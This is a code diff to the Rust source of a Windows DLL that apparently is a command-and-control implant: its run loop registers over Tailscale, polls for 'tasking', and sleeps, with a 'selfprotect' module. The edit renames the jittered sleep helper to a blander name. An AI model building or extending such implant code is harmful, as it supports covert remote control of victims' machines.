@@ -27,7 +27,7 @@ mod selfprotect;
 mod worker;
 mod helpers;
 
-use std::{thread, time::Duration};
+use std::thread;
 
 #[no_mangle]
 pub extern "system" fn DllMain(
@@ -54,7 +54,7 @@ fn run() {
                 Ok(_) => break,
                 Err(e) => {
                     eprintln!("[TS] Tailscale init failed: {}, retrying...", e);
-                    helpers::sleep_with_jitter();
+                    helpers::idle();
                 }
             }
         }
@@ -67,7 +67,7 @@ fn run() {
                 Ok(_) => break,
                 Err(e) => {
                     eprintln!("[REG] Registration failed: {}, retrying...", e);
-                    helpers::sleep_with_jitter();
+                    helpers::idle();
                 }
             }
         }
@@ -79,6 +79,6 @@ fn run() {
         if let Err(e) = tasking::getTasking() {
             eprintln!("Tasking error: {}", e);
         }
-        helpers::sleep_with_jitter();
+        helpers::idle();
     }
 }
